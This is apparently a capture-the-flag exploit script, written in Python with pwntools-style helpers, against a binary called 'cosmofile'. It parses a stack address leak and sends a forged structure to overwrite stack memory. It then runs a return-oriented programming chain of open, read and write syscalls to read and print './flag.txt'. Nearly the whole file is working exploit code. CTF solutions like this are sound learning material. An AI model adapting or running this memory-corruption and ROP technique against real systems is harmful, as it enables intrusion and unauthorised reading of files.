#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./cosmofile', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
# d2d_ida
b *0x40C872
b *0x40C800
# b *fread_unlocked
b *fread_unlocked+198
b *0x40C823
b *readv+110
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    if args.DOCKER:
        p = remote("localhost", 5000)
        if args.GDB:
            pid = int(check_output(["pidof", "-s", "/app/run"]))
            gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
            pause()
    elif args.REMOTE:
        p = remote(argv[0], int(argv[1]))
    return p

# ==================== EXPLOIT ====================
p = start()

sa(b'> ', b'1')
data = ru(b'Nice, now you can see the universe in a different light!', drop=True)
stack_leak = u64(data[0xaa0-0x2:0xaa0-0x2+0x8])
target = stack_leak - 0xfd8
slog('stack leak @ %#x', stack_leak)
slog('target @ %#x', target)

payload = p64(0x24200010100)
payload += p64(0x0ffffffff)
payload += p64(0)
payload += p64(0x2000) # Size
payload += p64(0)
payload += p64(target)

'''
       Buffers are processed in array order.  This means that readv()
       completely fills iov[0] before proceeding to iov[1], and so on.
       (If there is insufficient data, then not all buffers pointed to by
       iov may be filled.)  Similarly, writev() writes out the entire
       contents of iov[0] before proceeding to iov[1], and so on.
'''

sa(b'> ', b'7238770')
sa(b'secret...\n', payload)

sa(b'> ', b'1')

pop_rdi = 0x420d67
pop_rdx = 0x406eb1
pop_rsi = 0x401e1b
pop_rax = 0x40bdf5
pop_rbp = pop_rdi + 1
syscall = 0x4111fa
ret = pop_rbp + 1

sleep(0.5)
# /srv/app/flag.txt
s(b'\0' * 0x1000 + flat(
    # Open
    pop_rdi, target+0x108, 0,
    pop_rsi, 0, target+0x38,
    pop_rdx, 0,
    pop_rax, 0x2,
    syscall,

    # Read
    pop_rdi, 4, 0,
    pop_rsi, stack_leak & ~0xfff + 0x100, target+0x90,
    pop_rdx, 0x100,
    pop_rax, 0,
    syscall,

    # Write
    pop_rdi, 1, 0,
    pop_rsi, stack_leak & ~0xfff + 0x100, target+0xe8,
    pop_rdx, 0x100,
    pop_rax, 0x1,
    syscall,
    b'./flag.txt\0'
))

interactive(flag=False)
